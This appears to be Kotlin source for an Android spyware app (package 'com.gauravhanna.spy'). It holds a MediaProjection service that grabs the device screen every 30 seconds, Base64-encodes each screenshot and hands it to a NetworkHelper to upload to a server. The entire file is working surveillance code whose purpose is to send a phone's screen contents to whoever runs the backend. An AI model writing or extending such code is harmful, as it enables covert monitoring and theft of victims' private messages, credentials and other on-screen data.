package com.gauravhanna.spy

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Handler
import android.os.HandlerThread
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import java.io.ByteArrayOutputStream
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean

class MediaProjectionService : Service() {
    
    companion object {
        private const val TAG = "MediaProjectionService"
        private const val CHANNEL_ID = "screen_capture_channel"
        private const val NOTIFICATION_ID = 789
        private const val VIRTUAL_DISPLAY_NAME = "ScreenCapture"
        private const val SCREEN_DPI = 240
        
        private var instance: MediaProjectionService? = null
        private var mediaProjection: MediaProjection? = null
        private var virtualDisplay: VirtualDisplay? = null
        private var imageReader: ImageReader? = null
        
        private val isCapturing = AtomicBoolean(false)
        private val screenshotExecutor = Executors.newSingleThreadScheduledExecutor()
        
        fun start(context: Context, resultCode: Int, data: Intent) {
            val intent = Intent(context, MediaProjectionService::class.java).apply {
                putExtra("resultCode", resultCode)
                putExtra("data", data)
            }
            context.startService(intent)
        }
        
        fun stop(context: Context) {
            val intent = Intent(context, MediaProjectionService::class.java)
            context.stopService(intent)
        }
        
        fun isRunning(): Boolean = isCapturing.get()
    }
    
    private var resultCode: Int = -1
    private var data: Intent? = null
    private var projectionManager: MediaProjectionManager? = null
    private var backgroundHandler: Handler? = null
    private var backgroundThread: HandlerThread? = null
    
    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        
        backgroundThread = HandlerThread("ScreenCaptureThread").apply { start() }
        backgroundHandler = Handler(backgroundThread?.looper)
        
        projectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        
        instance = this
        Log.d(TAG, "MediaProjectionService created")
    }
    
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        intent ?: return START_NOT_STICKY
        
        resultCode = intent.getIntExtra("resultCode", -1)
        data = intent.getParcelableExtra("data")
        
        if (resultCode != -1 && data != null) {
            startForeground(NOTIFICATION_ID, getNotification())
            startScreenCapture()
        } else {
            Log.e(TAG, "Missing MediaProjection data")
            stopSelf()
        }
        
        return START_STICKY
    }
    
    private fun startScreenCapture() {
        if (isCapturing.get()) {
            Log.d(TAG, "Already capturing")
            return
        }
        
        try {
            mediaProjection = projectionManager?.getMediaProjection(resultCode, data!!)
            mediaProjection?.registerCallback(callback, backgroundHandler)
            
            setupImageReader()
            setupVirtualDisplay()
            
            isCapturing.set(true)
            
            // Start periodic screenshots every 30 seconds
            startPeriodicScreenshots()
            
            Log.d(TAG, "Screen capture started")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start screen capture: ${e.message}")
            stopSelf()
        }
    }
    
    private fun setupImageReader() {
        val displayMetrics = resources.displayMetrics
        val width = displayMetrics.widthPixels
        val height = displayMetrics.heightPixels
        
        imageReader = ImageReader.newInstance(width, height, android.graphics.ImageFormat.JPEG, 2)
        
        imageReader?.setOnImageAvailableListener({ reader ->
            val image = reader.acquireLatestImage()
            if (image != null) {
                captureScreenshot(image)
                image.close()
            }
        }, backgroundHandler)
    }
    
    private fun setupVirtualDisplay() {
        val displayMetrics = resources.displayMetrics
        
        virtualDisplay = mediaProjection?.createVirtualDisplay(
            VIRTUAL_DISPLAY_NAME,
            displayMetrics.widthPixels,
            displayMetrics.heightPixels,
            SCREEN_DPI,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            imageReader?.surface,
            null,
            backgroundHandler
        )
    }
    
    private fun captureScreenshot(image: android.media.Image) {
        try {
            val buffer = image.planes[0].buffer
            val bytes = ByteArray(buffer.remaining())
            buffer.get(bytes)
            
            // Convert to Base64
            val base64Image = android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP)
            
            Log.d(TAG, "Screenshot captured, size: ${bytes.size} bytes")
            
            // Send to server
            NetworkHelper.sendScreenshot(this, base64Image)
            
        } catch (e: Exception) {
            Log.e(TAG, "Failed to capture screenshot: ${e.message}")
        }
    }
    
    private fun startPeriodicScreenshots() {
        screenshotExecutor.scheduleAtFixedRate({
            if (isCapturing.get()) {
                captureManualScreenshot()
            }
        }, 5, 30, TimeUnit.SECONDS)
    }
    
    private fun captureManualScreenshot() {
        try {
            val displayMetrics = resources.displayMetrics
            val width = displayMetrics.widthPixels
            val height = displayMetrics.heightPixels
            
            val tempReader = ImageReader.newInstance(width, height, android.graphics.ImageFormat.JPEG, 1)
            val tempDisplay = mediaProjection?.createVirtualDisplay(
                "TempCapture",
                width, height, SCREEN_DPI,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                tempReader.surface, null, backgroundHandler
            )
            
            tempReader.setOnImageAvailableListener({ reader ->
                val image = reader.acquireLatestImage()
                if (image != null) {
                    captureScreenshot(image)
                    image.close()
                }
                tempDisplay?.release()
                tempReader.close()
            }, backgroundHandler)
            
        } catch (e: Exception) {
            Log.e(TAG, "Manual screenshot failed: ${e.message}")
        }
    }
    
    private val callback = object : MediaProjection.Callback() {
        override fun onStop() {
            Log.d(TAG, "MediaProjection stopped")
            stopScreenCapture()
        }
    }
    
    private fun stopScreenCapture() {
        isCapturing.set(false)
        
        virtualDisplay?.release()
        virtualDisplay = null
        
        imageReader?.close()
        imageReader = null
        
        mediaProjection?.stop()
        mediaProjection = null
        
        Log.d(TAG, "Screen capture stopped")
    }
    
    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Screen Capture",
                NotificationManager.IMPORTANCE_LOW
            )
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
    }
    
    private fun getNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Screen Capture Active")
            .setContentText("Capturing screenshots periodically")
            .setSmallIcon(android.R.drawable.ic_menu_camera)
            .build()
    }
    
    override fun onDestroy() {
        super.onDestroy()
        stopScreenCapture()
        backgroundThread?.quitSafely()
        screenshotExecutor.shutdown()
        instance = null
        Log.d(TAG, "MediaProjectionService destroyed")
    }
    
    override fun onBind(intent: Intent?): IBinder? = null
}